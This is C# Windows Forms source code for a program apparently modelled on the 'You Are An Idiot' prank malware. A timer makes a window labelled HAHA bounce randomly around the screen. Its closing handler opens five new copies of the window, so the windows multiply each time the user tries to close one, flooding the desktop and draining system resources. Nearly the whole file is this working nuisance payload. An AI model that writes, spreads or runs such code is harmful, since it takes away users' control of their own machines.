using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace YouAreAnIdiot_UnFlash
{
    public partial class HAHA : Form
    {
        public HAHA()
        {
            InitializeComponent();
            MovingWindow.Start();
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            Rectangle workingArea = SystemInformation.WorkingArea;
            int num = checked(Screen.PrimaryScreen.Bounds.Width - this.Width);
            int height = Screen.PrimaryScreen.Bounds.Height;
            int integer1 = Conversions.ToInteger(this.MoveX.Text);
            int integer2 = Conversions.ToInteger(this.MoveY.Text);
            int multiplier = 1;
            if (height >= 1440) multiplier = 2;
            if (Conversions.ToDouble(this.X.Text) >= (double)num)
            {
                this.MoveX.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                if (Conversions.ToDouble(this.MoveY.Text) < 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                else if (Conversions.ToDouble(this.MoveY.Text) > 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
            }
            if (Conversions.ToDouble(this.Y.Text) >= (double)checked(height - this.Height))
            {
                this.MoveY.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                if (Conversions.ToDouble(this.MoveX.Text) < 0.0)
                    this.MoveX.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                else if (Conversions.ToDouble(this.MoveX.Text) > 0.0)
                    this.MoveX.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
            }
            if (Conversions.ToDouble(this.X.Text) <= 0.0)
            {
                this.MoveX.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
                if (Conversions.ToDouble(this.MoveY.Text) < 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                else if (Conversions.ToDouble(this.MoveY.Text) > 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
            }
            if (Conversions.ToDouble(this.Y.Text) <= 0.0)
            {
                this.MoveY.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
                if (Conversions.ToDouble(this.MoveY.Text) < 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(-(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd()))) * multiplier));
                else if (Conversions.ToDouble(this.MoveY.Text) > 0.0)
                    this.MoveY.Text = Conversions.ToString(checked(1 + (int)Math.Round((double)unchecked(34f * VBMath.Rnd())) * multiplier));
            }
            this.X.Text = Conversions.ToString(Conversions.ToDouble(this.X.Text) + (double)integer1);
            this.Y.Text = Conversions.ToString(Conversions.ToDouble(this.Y.Text) + (double)integer2);
            this.Location = new Point(Conversions.ToInteger(this.X.Text), Conversions.ToInteger(this.Y.Text));
        }

        private void HAHA_Closing(object sender, FormClosingEventArgs e)
        {
            HAHA haha1 = new HAHA();
            HAHA haha2 = new HAHA();
            HAHA haha3 = new HAHA();
            HAHA haha4 = new HAHA();
            HAHA haha5 = new HAHA();
            haha1.Show();
            haha2.Show();
            haha3.Show();
            haha4.Show();
            haha5.Show();

        }
    }
}
